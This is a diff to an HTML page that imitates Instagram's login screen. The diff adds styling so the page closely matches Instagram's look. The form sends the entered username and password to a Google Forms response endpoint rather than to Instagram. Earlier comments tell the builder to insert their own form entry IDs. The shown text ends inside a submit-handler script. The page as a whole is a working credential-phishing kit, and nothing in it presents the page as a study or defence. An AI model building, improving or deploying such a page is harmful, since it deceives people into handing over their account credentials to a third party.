@@ -1,17 +1,111 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            width: 350px;
+            text-align: center;
+        }
+        .title {
+            font-size: 36px;
+            font-weight: bold;
+            color: #262626;
+            margin-bottom: 20px;
+        }
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 25px;
+            border-radius: 5px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        .login-box input[type="text"],
+        .login-box input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            background-color: #fafafa;
+            font-size: 14px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .login-box input[type="text"]:focus,
+        .login-box input[type="password"]:focus {
+            border-color: #0095f6;
+        }
+        .login-box input[type="submit"] {
+            width: 100%;
+            padding: 8px;
+            margin: 15px 0;
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .login-box input[type="submit"]:hover {
+            background-color: #007bb5;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        .divider hr {
+            flex-grow: 1;
+            border: none;
+            border-top: 1px solid #dbdbdb;
+        }
+        .divider span {
+            margin: 0 10px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        .footer a {
+            color: #00376b;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-    <h1>Instagram</h1>
-    <form id="loginForm" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeeQOC82j3KlAIyLeF57niS63fow9ij7N6VjaZVy-ayxhv4Cg/formResponse" method="POST">
-        <label>Username:</label><br>
-        <input type="text" name="entry.363416333"><br> <!-- Replace with your Username entry ID -->
-        <label>Password:</label><br>
-        <input type="password" name="entry.20945221"><br> <!-- Replace with your Password entry ID -->
-        <input type="submit" value="Log In">
-    </form>
+    <div class="login-container">
+        <div class="title">Instagram</div>
+        <div class="login-box">
+            <form id="loginForm" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeeQOC82j3KlAIyLeF57niS63fow9ij7N6VjaZVy-ayxhv4Cg/formResponse" method="POST">
+                <input type="text" name="entry.363416333" placeholder="Phone number, username, or email" required>
+                <input type="password" name="entry.20945221" placeholder="Password" required>
+                <input type="submit" value="Log In">
+            </form>
+            <div class="divider">
+                <hr><span>OR</span><hr>
+            </div>
+            <div class="footer">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+        </div>
+    </div>
     <script>
         document.getElementById("loginForm").addEventListener("submit", function(event) {
             console.log("Submitting to Google Sheets...");
